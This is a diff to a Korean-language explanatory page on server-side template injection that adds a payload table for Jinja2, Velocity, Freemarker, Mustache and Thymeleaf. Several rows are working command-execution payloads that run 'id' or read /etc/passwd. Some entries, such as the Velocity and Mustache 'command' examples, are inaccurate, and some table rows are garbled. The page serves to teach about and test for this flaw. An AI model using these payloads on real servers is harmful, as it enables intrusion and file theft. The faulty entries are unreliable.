@@ -8,7 +8,7 @@ SSTI(Server-Side Template Injection)는 서버 측에서 사용하는 템플릿 
 
 웹 애플리케이션에서 템플릿 엔진(예: Jinja2, Velocity, FreeMarker 등)을 사용하여 HTML 페이지를 동적으로 생성하는 경우, 템플릿 엔진의 **입력값을 그대로 사용**하는 취약점이 존재할 수 있습니다. 이때, 사용자가 악의적인 템플릿 코드를 삽입하면 서버에서 의도치 않게 코드가 실행됩니다.
 
-## 🐧 웹 애플리케이션에서 템플릿 엔진을 사용하여 HTML 페이지를 동적으로 생성하는지 아닌지 판별하는 방법
+## 🐧 웹 애플리케이션에서 템플릿 엔진을 사용하여 HTML 페이지를 동적으로 생성하는지 판별하는 방법
 
 #### (1) **HTTP 응답 분석하기**
 
@@ -142,6 +142,24 @@ SSTI(Server-Side Template Injection)는 서버 측에서 사용하는 템플릿 
 | **SSTI (PHP)**        | \`{{ "phpinfo()"                                                                                                                     | shell\_exec }}\`                               |   |
 | **SSTI (Thymeleaf)**  | \`                                                                                                                                   | \${#request.getAttribute('some\_parameter')}\` |   |
 |                       | `${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}`                                                                       |                                                |   |
+
+---
+
+| **공격 유형**           | **페이로드**                                                                                                         | **설명**                                                     |                                           |
+| ------------------- | ---------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------- | ----------------------------------------- |
+| **Jinja2 SSTI**     | `{{ 7 * 7 }}`                                                                                                    | Jinja2에서 숫자 계산을 수행하는 기본적인 페이로드. 서버에서 `49`라는 출력 결과를 반환하게 됨. |                                           |
+|                     | `{{ config }}`                                                                                                   | 서버 설정 정보가 출력됨. 서버의 구체적인 설정이나 민감한 정보 노출 가능.                 |                                           |
+|                     | `{{ ''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['os'].popen('id').read() }}`               | 시스템 명령을 실행하여 서버의 사용자 정보를 얻음. (`id` 명령어 실행)                 |                                           |
+|                     | `{{ ''.__class__.__mro__[1].__subclasses__()[305].__init__.__globals__['os'].popen('cat /etc/passwd').read() }}` | 시스템에서 중요한 파일을 읽어오는 페이로드. (`/etc/passwd` 파일을 출력)            |                                           |
+| **Velocity SSTI**   | `#set($foo = "Hello") #set($bar = "World") $foo $bar`                                                            | Velocity 템플릿에서 변수를 설정하고 출력하는 간단한 예시.                       |                                           |
+|                     | `#foreach($i in [1..5]) $i #end`                                                                                 | 반복문을 사용하여 1부터 5까지 숫자를 출력하는 예시.                             |                                           |
+|                     | `#set($exec = $toolBox.get("os")) #exec($exec)`                                                                  | 서버에서 `os` 명령어를 실행하여 정보를 가져오는 예시. (`os` 명령어 실행)             |                                           |
+| **Freemarker SSTI** | `<#assign foo = "bar"> <#if foo == "bar">Success</#if>`                                                          | Freemarker 템플릿에서 조건문을 사용하여 "Success"를 출력.                  |                                           |
+|                     | \`<#assign exec = "foo" > <#if exec == "foo"> \${"id"                                                            | exec} \</#if>\`                                            | Freemarker에서 시스템 명령을 실행하여 서버의 `id` 정보 출력. |
+| **Mustache SSTI**   | `{{#users}} Hello, {{name}}! {{/users}}`                                                                         | 기본적인 Mustache 템플릿을 사용한 예시로, 사용자 목록을 출력하는 페이로드.             |                                           |
+|                     | `{{#command}}{{command}}{{/command}}`                                                                            | 외부 커맨드를 실행하여 결과를 Mustache 템플릿에서 보여주는 페이로드.                 |                                           |
+| **Thymeleaf SSTI**  | `#{T(java.lang.System).getenv()}`                                                                                | Thymeleaf 템플릿에서 Java 클래스를 호출하여 환경 변수 출력.                   |                                           |
+|                     | `${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}`                                                   | 서버에서 시스템 명령을 실행하여 `/etc/passwd` 파일을 읽는 페이로드.               |                                           |
 
 ---
 
